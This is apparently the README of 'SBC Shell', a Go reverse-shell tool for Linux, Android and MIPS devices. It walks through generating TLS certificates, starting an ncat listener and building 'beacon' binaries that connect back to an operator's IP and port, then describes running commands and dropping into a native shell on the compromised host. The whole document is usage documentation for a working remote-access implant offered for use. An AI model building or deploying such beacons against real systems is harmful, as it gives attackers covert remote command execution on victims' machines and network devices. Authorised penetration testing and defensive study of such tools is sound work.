### SBC Shell

SBC Shell is a simple encrypted shell written in golang that can be compiled for multiple architectures.  Currently the only supported builds are for linux 64bit, Android arm7, and mips.  Using certificates generated with openssl traffic is tls encrypted.  The python script included can be used start a ncat listener or to build beacon binaries.

NOTE:  All files including certificates should be kept and run from the same folder where main.go, Makefile and the Shell folder are. Running or storing files in other locations will result in the python script not finding the needed files. 

NOTE:  During testing the android arm7 was not building for some complication in golang.  This is being worked and will be updated once functioning.

### Dependencies

```
apt install golang ncat openssl
```

### Creating Certificates with OpenSSL

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout server.key -out server.pem

cat server.key >> server.pem

### Building Binaries with SBCShell_Builder.py

#### Start Server

```
python3 SBCShell_Builder.py -s -p <Port to Listen on>
```

#### Build a Beacon binary

```
python3 SBCShell_Builder.py -i <IP to Beacon to> -p <Port to connect to> -o <linux,mips,android>
```

### Shell use

You can run any native command that provides outpt to stdout in the shell which will print back on the screen. If you need to drop into a native shell to be able to change directories or other things run the command "go_native".  Doing so will drop you into a notn pty shell.